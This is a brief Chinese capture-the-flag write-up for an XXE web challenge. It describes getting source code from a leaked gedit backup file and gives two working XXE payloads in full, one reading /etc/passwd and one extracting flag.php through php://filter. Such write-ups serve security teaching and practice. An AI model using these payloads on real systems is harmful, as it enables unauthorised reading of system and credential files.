# XX?

> 分类：Web（第三届广东省强网杯）

## 题目描述

XXE 漏洞。通过 gedit 备份文件 `index.php~` 获取源码，构造 XXE 读取 flag。

## 考察知识点

- 备份文件泄露（index.php~）
- XXE 注入

## 解法

1. 访问 index.php，标题是 gedit，猜测有 gedit 备份文件，访问 `index.php~` 获取源码。
2. 源码通过 `php://input` 获取 POST 内容并作为 XML 解析，存在 XXE。
3. 先用普通 XML 测试回显，再构造 XXE 读取 `/etc/passwd`：

```xml
<?xml version="1.0"?>
<!DOCTYPE ANY [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>
<creds><user>&xxe;</user></creds>
```

4. 发现根目录有 flag.php，用 php://filter 读取：

```xml
<?xml version="1.0"?>
<!DOCTYPE ANY [<!ENTITY xxe SYSTEM 'php://filter/read=convert.base64-encode/resource=./flag.php'>]>
<creds><user>&xxe;</user></creds>
```

base64 解码得 flag。

## 参考答案

（flag 通过 XXE 读取 flag.php）

## 来源

- 作者：TimeShatter | https://blog.csdn.net/qq_28205153/article/details/102899260
